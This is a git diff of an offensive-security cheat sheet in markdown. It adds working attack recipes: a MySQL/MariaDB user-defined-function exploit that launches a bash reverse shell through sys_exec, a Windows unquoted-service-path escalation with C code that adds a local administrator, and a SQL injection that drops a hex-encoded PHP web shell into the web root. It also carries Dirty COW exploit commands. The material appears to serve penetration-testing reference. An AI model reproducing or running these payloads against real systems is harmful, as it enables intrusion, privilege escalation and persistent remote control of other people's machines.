@@ -1358,25 +1358,46 @@ $ mysql -u snovvcrash -p'Passw0rd!' -e 'show databases;'
 
 * [https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518)
 * [https://github.com/mysqludf/lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys)
+* [https://gist.github.com/snovvcrash/efeb79d3e2648ec5009dd2ea7052f8b9](https://gist.github.com/snovvcrash/efeb79d3e2648ec5009dd2ea7052f8b9)
 
-Install dependencies and compile `.so` library:
+Install dependencies:
 
 ```
 $ sudo apt install libmariadbclient-dev -y
 $ git clone https://github.com/mysqludf/lib_mysqludf_sys && cd lib_mysqludf_sys
-$ gcc -m64 -fPIC -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/server/private -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so -L/usr/lib/x86_64-linux-gnu/libstdc++.so.6
 ```
 
-Load library and call user-defined `sys_exec` function:
+Compile `.so` library for x86_64:
+
+```
+$ gcc lib_mysqludf_sys_x64.c -o lib_mysqludf_sys_x64.so -m64 -fPIC -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/server/private -I. -shared -L/usr/lib/x86_64-linux-gnu/libstdc++.so.6
+```
+
+Load library and call user-defined `sys_exec` function with a rev-shell.
+
+MySQL (x86 example):
+
+```
+mysql> use mysql;
+mysql> create table pwn(line blob);
+mysql> insert into pwn values(load_file('/tmp/lib_mysqludf_sys_x86.so'));
+mysql> select * from pwn into dumpfile '/usr/lib/lib_mysqludf_sys_x86.so';
+(Or load it from hex: mysql> select unhex('7F..00') into dumpfile '/usr/lib/lib_mysqludf_sys_x86.so';)
+mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_x86.so';
+mysql> select sys_exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'");
+```
+
+MariaDB (x86_64 example):
 
 ```
 MariaDB> show variables like '%plugin%';  # get lib path
 MariaDB> use mysql;
 MariaDB> create table pwn(line blob);
-MariaDB> insert into pwn values(load_file('/tmp/lib_mysqludf_sys.so'));
-MariaDB> select * from pwn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
-MariaDB> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
-MariaDB> select sys_exec("<REVERSE_SHELL>");
+MariaDB> insert into pwn values(load_file('/tmp/lib_mysqludf_sys_x64.so'));
+MariaDB> select * from pwn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys_x64.so';
+(Or load it from hex: MariaDB> select unhex('7F..00') into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys_x64.so';)
+MariaDB> create function sys_exec returns integer soname 'lib_mysqludf_sys_x64.so';
+MariaDB> select sys_exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'");
 ```
 
 
@@ -3924,7 +3945,7 @@ $ ifup eth2
 * [https://kali.training/topic/configuring-the-network/](https://kali.training/topic/configuring-the-network/)
 * [https://www.blackmoreops.com/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/](https://www.blackmoreops.com/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/)
 * [https://www.virtualbox.org/manual/ch06.html](https://www.virtualbox.org/manual/ch06.html)
-* [eth0-eth1-etc)-can-be-active-at-a-time]://forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time](https://forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time)
+* [https://forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time](https://forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-%28eth0-eth1-etc%29-can-be-active-at-a-time)
 
 
 
@@ -4113,7 +4134,7 @@ find / -type f -perm /6000 -ls 2>/dev/null
 
 ```
 $ curl -L https://github.com/FireFart/dirtycow/raw/master/dirty.c > dirty.c
-$ gcc -pthread dirty.c -o dirty -lcrypt
+$ gcc dirty.c -o dirty -pthread -lcrypt
 $ ./dirty Passw0rd
 $ su firefart
 ```
@@ -4215,6 +4236,61 @@ Find weak service permissions:
 * [PayloadsAllTheThings/Example with Windows XP SP0/SP1 - upnphost](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#example-with-windows-xp-sp1---upnphost)
 * [https://www.exploit-db.com/exploits/1465](https://www.exploit-db.com/exploits/1465)
 * [http://www.tarasco.org/security/srvcheck/index.html](http://www.tarasco.org/security/srvcheck/index.html)
+
+
+
+### Unquoted Service Paths
+
+* [https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths](https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths)
+
+[CreateProcessA](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) function treats an unquoted `BINARY_PATH_NAME` like follows:
+
+```
+C:\Program Files\Sub Directory\Program Name.exe
+  -> C:\Program.exe
+  -> C:\Program Files\Sub.exe
+  -> C:\Program Files\Sub Directory\Program.exe
+  -> C:\Program Files\Sub Directory\Program Name.exe
+
+C:\Program.exe C:\Program Files\Sub.exe C:\Program Files\Sub Directory\Program.exeC:\Program Files\Sub Directory\Program Name.exe
+```
+
+It gives an attacker the ability to inject malious binary into path to be executed with vulnerable service permissions:
+
+```
+Cmd > sc qc VulnerableSvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: VulnerableSvc
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\Vulnerable\Vulnerable Service\VulnerableService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : IperiusRemote Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+Cmd > move pwn.exe "C:\Program Files\Vulnerable\Vulnerable.exe"
+Cmd > sc stop VulnerableSvc
+Cmd > sc start VulnerableSvc
+...Or restart the PC if the attacker has SeShutdownPrivilege...
+```
+
+Malious binary example:
+
+```c
+// i686-w64-mingw32-gcc -o pwn.exe pwn.c
+
+ #include <stdio.h>
+ #include <stdlib.h>
+
+void main() {
+        system("net user snovvcrash Passw0rd! /add");
+        system("net localgroup administrators snovvcrash /add");
+}
+```
 
 
 
@@ -5622,7 +5698,7 @@ PS > Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name C
 ### wmiexec.py
 
 ```
-$ wmiexec.py snovvcrash:'Passw0rd!'@127.0.0.1
+$ wmiexec.py snovvcrash:'Passw0rd!'@127.0.0.1 [-codec cp866]
 $ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
 ```
 
@@ -7058,6 +7134,7 @@ id=-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb
 
 ```
 id=1' UNION ALL SELECT 1,2,3,4,"<?php if(isset($_REQUEST['c'])){system($_REQUEST['c'].' 2>&1' );} ?>",6 INTO OUTFILE 'C:\\Inetpub\\wwwroot\\backdoor.php';#
+id=1' UNION SELECT 1,2,3,4,5,6 INTO OUTFILE '/var/www/html/backdoor.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d2f7661722f7777772f68746d6c2f3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a;-- -
 ```
 
 
